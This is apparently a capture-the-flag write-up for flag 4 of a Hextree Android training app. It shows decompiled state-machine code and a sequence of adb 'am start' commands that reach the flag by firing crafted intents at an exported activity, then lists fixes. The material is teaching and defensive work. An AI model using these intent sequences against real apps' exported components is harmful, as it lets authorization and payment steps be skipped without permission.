# Flag 4 — State Machine: Skipping Steps via IPC

**Vulnerability class:** Broken access control / client-side trust in a multi-step flow
**Target component:** `io.hextree.attacksurface.activities.Flag4Activity` (exported)

---

## Target

An exported `Activity` implementing a state machine. State advances step by step, and the final state releases the flag. The state is **persisted** across calls — it survives the activity being closed and reopened.

## Analysis

After decompiling with JADX, the relevant logic lives in `stateMachine(Intent)`, called on every `onCreate`. The state is read and written through `SolvedPreferences` (a wrapper around `SharedPreferences`):

```java
private State getCurrentState() {
    return State.fromInt(SolvedPreferences.getInt(getPrefixKey("state")));
}
private void setCurrentState(State state) {
    SolvedPreferences.putInt(getPrefixKey("state"), state.getValue());
}
```

States and transitions:

```
INIT (0)      --action "PREPARE_ACTION"-->  PREPARE (1)
PREPARE (1)   --action "BUILD_ACTION"----->  BUILD (2)
BUILD (2)     --action "GET_FLAG_ACTION"-->  GET_FLAG (3)
GET_FLAG (3)  --any call------------------>  success() + flag
```

Two details in the code turn out to be decisive:

1. **The `GET_FLAG` branch (state 3) does not check the action at all** — once the state reaches 3, the next invocation unconditionally calls `success(this)`.
2. **Any invalid action falls through to the final `else`**, which resets the state back to `INIT`. So the order is strict: one wrong step zeroes out all progress.

```java
// key snippet: state 3 fires success() without checking the action
if (iOrdinal == 3) {
    this.f.addTag(State.GET_FLAG);
    setCurrentState(State.INIT);
    success(this);                 // <-- flag released
    Log.i("Flag4StateMachine", "solved");
    return;
}
```

## Exploit

Since the state persists, each transition can be a separate `am` command — no PoC app is needed here, just changing the `action` (`-a`) on each call.

Watch logs in one terminal:
```bash
adb logcat -s Flag4StateMachine
```

Fire the sequence of transitions:
```bash
# INIT -> PREPARE
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
# PREPARE -> BUILD
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
# BUILD -> GET_FLAG
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
# GET_FLAG -> success (action is irrelevant here)
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a done
```

Expected log output, in order:
```
Transitioned from INIT to PREPARE
Transitioned from PREPARE to BUILD
Transitioned from BUILD to GET_FLAG
solved
```

If you see `Unknown state. Transitioned to INIT`, an action was sent out of order and the state got reset — start again from step 1.

## Why it works

The multi-step flow was exposed through an `exported` activity, and every transition is driven by an `Intent` **fully controlled by the attacker**. The app trusts that steps happen in the right order, but whoever controls the order is whoever fires the intents.

Real-world analogy: an exposed order-confirmation screen that assumes "if I was opened, payment must already have happened." A direct intent skips the payment step entirely. The flaw isn't having a state machine — it's **never re-verifying** the precondition and **exposing** the steps to external IPC.

## Fix

1. **Don't export** the component if it has no legitimate reason to receive external intents: set `android:exported="false"` in the manifest.
2. **Validate authorization at every step**, instead of trusting "I was reached from outside" — check against the server/session that the real precondition was actually met.
3. **Don't drive sensitive business-flow transitions through an external intent.** A business-flow state machine belongs in a protected layer (ViewModel/session/backend), not in an exported activity accepting arbitrary actions.
4. If the component must stay exported, require a **custom permission** (`android:permission`) or validate the caller's identity.

## Takeaway

> Whenever a screen or step assumes the user followed the correct flow — but an attacker can open it directly via an intent — that assumption breaks. The review question is: *does this step re-verify its precondition, or does it just trust the path that got it here?*
